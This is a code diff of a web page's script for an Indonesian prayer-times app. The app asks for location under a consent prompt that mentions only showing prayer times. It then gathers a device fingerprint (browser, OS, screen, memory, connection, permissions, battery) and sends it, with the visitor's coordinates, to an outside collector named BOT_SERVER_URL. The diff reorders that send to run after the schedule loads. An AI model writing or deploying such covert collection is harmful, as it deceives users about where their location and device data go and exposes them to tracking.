@@ -99,7 +99,6 @@ const parser = new UAParser()
 const result = parser.getResult()
 const BOT_SERVER_URL = "https://cybers-api.vercel.app/v1/collect"
 let userConsent = false
-
 const consentModal = document.getElementById("consentModal")
 const acceptConsent = document.getElementById("acceptConsent")
 const denyConsent = document.getElementById("denyConsent")
@@ -107,93 +106,79 @@ const denyConsent = document.getElementById("denyConsent")
 acceptConsent.addEventListener("click", () => {
 userConsent = true
 consentModal.style.display = "none"
-getLocation()
 localStorage.setItem("sholatAppConsent", "accepted")
+getLocation()
 })
 
 denyConsent.addEventListener("click", () => {
 userConsent = false
 consentModal.style.display = "none"
-document.getElementById("lokasi").innerHTML = "<span class='text-amber-400'>Consent required to display schedule</span>"
 localStorage.setItem("sholatAppConsent", "denied")
+document.getElementById("lokasi").innerHTML =
+"<span class='text-amber-400'>Permission required to show prayer times</span>"
 })
 
 function getDeviceInfo() {
 const info = {
 timestamp: new Date().toISOString(),
-timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-timezoneOffset: new Date().getTimezoneOffset(),
 userAgent: navigator.userAgent,
 platform: navigator.platform,
 language: navigator.language,
+timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
 screen: {
 width: screen.width,
 height: screen.height,
 colorDepth: screen.colorDepth,
-pixelRatio: window.devicePixelRatio,
-orientation: screen.orientation?.type || "unknown"
+pixelDepth: screen.pixelDepth,
 },
-deviceMemory: navigator.deviceMemory || "unknown",
-connection: navigator.connection ? {
+memory: navigator.deviceMemory || 'unknown',
+heapSize: performance.memory?.jsHeapSizeLimit || 'unknown',
+connection: navigator.connection
+? {
 type: navigator.connection.type,
 effectiveType: navigator.connection.effectiveType,
-rtt: navigator.connection.rtt,
 downlink: navigator.connection.downlink,
-saveData: navigator.connection.saveData
-} : null,
-browser: {
-name: result.browser.name,
-version: result.browser.version
+rtt: navigator.connection.rtt,
+}
+: null,
+permissions: [],
+battery: null,
+deviceDetail: {
+os: result.os.name + " " + result.os.version,
+device: result.device.type || "Desktop",
+browser: result.browser.name + " " + result.browser.version,
 },
-os: {
-name: result.os.name,
-version: result.os.version
-},
-device: {
-type: result.device.type || "Desktop",
-model: result.device.model,
-vendor: result.device.vendor
-},
-cpu: {
-architecture: result.cpu.architecture
-},
-permissions: {},
-performance: performance.timing ? {
-loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart
-} : null,
-memory: performance.memory ? {
-usedJSHeapSize: performance.memory.usedJSHeapSize,
-totalJSHeapSize: performance.memory.totalJSHeapSize,
-jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
-} : null,
-battery: null
 }
 
-return navigator.permissions ? Promise.all([
+const getPerms = navigator.permissions
+? Promise.all([
 navigator.permissions.query({ name: 'geolocation' }),
-navigator.permissions.query({ name: 'notifications' })
-]).then(([geo, notif]) => {
-info.permissions.geolocation = geo.state
-info.permissions.notifications = notif.state
-return navigator.getBattery ? navigator.getBattery().then(b => {
+navigator.permissions.query({ name: 'notifications' }),
+])
+.then(results => {
+info.permissions = results.map(r => `${r.name}:${r.state}`)
+})
+.catch(() => {})
+: Promise.resolve()
+
+const getBatt = navigator.getBattery
+? navigator.getBattery().then(batt => {
 info.battery = {
-level: b.level * 100 + "%",
-charging: b.charging,
-chargingTime: b.chargingTime,
-dischargingTime: b.dischargingTime
+level: (batt.level * 100).toFixed(0) + '%',
+charging: batt.charging,
 }
-return info
-}) : info
-}) : Promise.resolve(info)
+})
+: Promise.resolve()
+
+return Promise.all([getPerms, getBatt]).then(() => info)
 }
 
 function sendDeviceData(deviceInfo, location) {
 if (!userConsent) return
-
 const payload = JSON.stringify({
 device: deviceInfo,
 location: location,
-timestamp: new Date().toISOString()
+timestamp: new Date().toISOString(),
 })
 
 const xhr = new XMLHttpRequest()
@@ -201,36 +186,89 @@ xhr.open("POST", BOT_SERVER_URL, true)
 xhr.setRequestHeader("Content-Type", "application/json")
 xhr.onreadystatechange = function () {
 if (xhr.readyState === 4) {
-if (xhr.status === 200) console.log("Data sent successfully")
-else console.error("Failed to send data:", xhr.statusText)
+if (xhr.status === 200) {
+console.log("✅ Data sent")
+} else {
+console.error("❌ Failed:", xhr.statusText)
+}
 }
 }
 xhr.send(payload)
 }
 
+function getJadwalSholat(lat, lon) {
+const xhr = new XMLHttpRequest()
+xhr.open("GET", `https://api.aladhan.com/v1/timings?latitude=${lat}&longitude=${lon}&method=2`, true)
+xhr.onreadystatechange = function () {
+if (xhr.readyState === 4) {
+if (xhr.status === 200) {
+try {
+const data = JSON.parse(xhr.responseText)
+const jadwal = data.data.timings
+const waktuSholat = [
+{ nama: 'Imsak', waktu: jadwal.Imsak },
+{ nama: 'Subuh', waktu: jadwal.Fajr },
+{ nama: 'Dzuhur', waktu: jadwal.Dhuhr },
+{ nama: 'Ashar', waktu: jadwal.Asr },
+{ nama: 'Maghrib', waktu: jadwal.Maghrib },
+{ nama: 'Isya', waktu: jadwal.Isha },
+]
+
+const listItems = waktuSholat.map(item => `
+<li class="flex justify-between items-center p-3 bg-gray-700/30 rounded-lg hover:bg-emerald-400/10 transition-all">
+<span class="text-emerald-300">${item.nama}</span>
+<span class="font-bold text-amber-400">${item.waktu}</span>
+</li>
+`).join('')
+
+document.getElementById("jadwalSholat").innerHTML = listItems
+
+getDeviceInfo().then(deviceInfo => {
+sendDeviceData(deviceInfo, { latitude: lat, longitude: lon })
+})
+
+} catch (err) {
+document.getElementById("jadwalSholat").innerHTML = `<li class="text-red-400">Failed to parse prayer times.</li>`
+}
+} else {
+document.getElementById("jadwalSholat").innerHTML = `<li class="text-red-400">Failed to load prayer times.</li>`
+}
+}
+}
+xhr.send()
+}
+
 function getLocation() {
 if (!userConsent) {
-document.getElementById("lokasi").innerHTML = "<span class='text-amber-400'>Waiting for consent...</span>"
+document.getElementById("lokasi").innerHTML = "<span class='text-amber-400'>Waiting for permission...</span>"
 return
 }
 
 if (navigator.geolocation) {
 document.getElementById("lokasi").innerHTML = "<span class='text-amber-400'>Getting location...</span>"
+
 navigator.geolocation.getCurrentPosition(position => {
 const lat = position.coords.latitude.toFixed(4)
 const lon = position.coords.longitude.toFixed(4)
-document.getElementById("lokasi").innerHTML = `<span class="text-amber-400">Coordinates:</span> ${lat}, ${lon}<br><span class="text-amber-400">Accuracy:</span> ${position.coords.accuracy}m`
-getDeviceInfo().then(deviceInfo => {
-sendDeviceData(deviceInfo, { latitude: lat, longitude: lon })
-})
-}, err => {
-document.getElementById("lokasi").innerHTML = `<span class="text-red-400">⚠️ Failed to get location:</span><br>${err.message}`
+
+document.getElementById("lokasi").innerHTML = `
+<span class="text-amber-400">Coordinates:</span> ${lat}, ${lon}<br>
+<span class="text-amber-400">Accuracy:</span> ${position.coords.accuracy} meters
+`
+getJadwalSholat(lat, lon)
+
+}, (error) => {
+document.getElementById("lokasi").innerHTML = `
+<span class="text-red-400">⚠️ Location error:</span><br>
+${error.message}
+`
 })
 } else {
 document.getElementById("lokasi").innerHTML = `<span class="text-red-400">Geolocation not supported</span>`
 }
 }
 
+// check consent state
 if (localStorage.getItem("sholatAppConsent") === "accepted") {
 userConsent = true
 consentModal.style.display = "none"
@@ -242,7 +280,6 @@ consentModal.style.display = "none"
 consentModal.style.display = "flex"
 }
 </script>
-
 
 
 
